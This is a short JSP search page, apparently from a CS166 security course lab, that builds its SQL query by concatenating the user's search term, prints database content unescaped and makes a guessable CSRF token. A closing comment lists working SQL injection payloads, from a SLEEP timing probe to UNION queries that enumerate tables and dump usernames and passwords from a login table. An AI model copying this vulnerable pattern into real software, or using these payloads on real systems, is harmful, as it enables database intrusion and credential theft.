<%@include file="db.jsp" %><%
String s = request.getParameter("s");
Statement stmt = con.createStatement();
String sql = "SELECT title, content from blog where title like '%" + s + "%'";
System.out.println(sql);
ResultSet rs = stmt.executeQuery(sql);
%>
<html>
<head>
<link rel="stylesheet" href="style.css">
</head>
<body>
<h1>My CS166 Blog Site</h1>

<hr>
<h1>Blog entries</h1>
<%	
while ( rs.next() ) {
	out.print("<div class='blogitem'><h3>" + rs.getString(1) + "</h3>");
	out.print(rs.getString(2) + "</div>");
}

String csrf = "" + System.currentTimeMillis() + Math.random() * 10000000;
session.setAttribute("csrf", csrf);
%>
<hr>

<%
/*
SELECT ?, ? from blog where ? like '%val%'

CIA%' ; -- '

CIA%' AND 1 = SLEEP(2) ; -- '

CIA%' UNION (SELECT 1, 2 FROM DUAL) ; -- '

//Get schema tables list
CIA%' UNION (SELECT table_schema, table_name FROM information_schema.tables) ; -- '

//Get users table schema
CIA%' UNION (SELECT column_name, data_type FROM information_schema.columns where table_name='login') ; -- '

//Get user listed
CIA%' UNION (SELECT user, pass FROM login) ; -- '
*/
%>
